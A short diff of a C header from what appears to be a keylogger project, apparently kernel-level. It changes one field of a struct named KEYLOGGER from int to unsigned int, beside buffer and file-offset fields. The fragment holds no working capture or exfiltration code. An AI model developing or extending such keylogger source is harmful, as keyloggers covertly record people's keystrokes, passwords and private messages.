@@ -27,6 +27,6 @@
         loff_t offset_in_file;
         char main_buffer[BUFF_SIZE];
         char back_buffer[BUFF_SIZE];
-        int id;
+        unsigned int id;
     }KEYLOGGER;
 #endif
